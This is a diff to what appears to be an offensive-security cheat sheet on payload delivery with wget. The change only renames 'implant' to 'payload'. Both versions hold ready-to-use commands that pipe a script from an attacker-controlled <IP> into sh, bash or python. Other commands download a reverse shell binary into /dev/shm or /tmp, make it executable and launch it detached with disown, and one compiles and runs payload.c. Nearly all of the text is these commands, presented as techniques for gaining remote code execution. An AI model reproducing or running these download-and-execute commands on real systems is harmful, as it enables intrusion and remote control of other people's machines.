@@ -5,11 +5,11 @@
 This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.
 
 ```
-$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | sh
+$ wget --no-hsts -qO- http[s]://<IP>/payload.sh | sh
 
-$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | bash
+$ wget --no-hsts -qO- http[s]://<IP>/payload.sh | bash
 
-$ wget --no-hsts -qO- http[s]://<IP>/implant.py | python
+$ wget --no-hsts -qO- http[s]://<IP>/payload.py | python
 ```
 
 ## 02 - Dropping On Memory
@@ -20,9 +20,9 @@ $ wget --no-hsts -qO- http[s]://<IP>/implant.py | python
 Download reverse shell binary and execute it.
 
 ```
-$ wget --no-hsts -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
+$ wget --no-hsts -P /dev/shm http[s]://<IP>/payload; chmod +x /dev/shm/payload; /dev/shm/payload & disown
 
-$ wget --no-hsts -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
+$ wget --no-hsts -O /dev/shm/payload http[s]://<IP>/payload; chmod +x /dev/shm/payload; /dev/shm/payload & disown
 ```
 
 ## 03 - Dropping On Disk
@@ -30,7 +30,7 @@ $ wget --no-hsts -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/i
 Download reverse shell binary and execute it.
 
 ```
-$ wget --no-hsts -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
+$ wget --no-hsts -O /tmp/payload http[s]://<IP>/payload; chmod +x /tmp/payload; /tmp/payload & disown
 ```
 
 ## 04 - Compiled After Delivery
@@ -38,7 +38,7 @@ $ wget --no-hsts -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; 
 TODO: Fill this info
 
 ```
-$ gcc -o implant implant.c && implant & disown
+$ gcc -o payload payload.c && payload & disown
 ```
 
 ---
